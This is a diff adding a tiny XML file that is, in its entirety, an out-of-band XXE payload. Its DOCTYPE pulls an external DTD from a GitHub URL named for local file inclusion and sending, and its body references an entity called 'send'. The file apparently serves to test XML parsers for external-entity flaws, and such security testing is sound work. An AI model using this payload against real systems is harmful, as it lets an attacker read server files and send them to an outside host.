@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "https://github.com/kazkiti/test/edit/master/XXE_LFI_send1.dtd">
+<data>&send;</data>
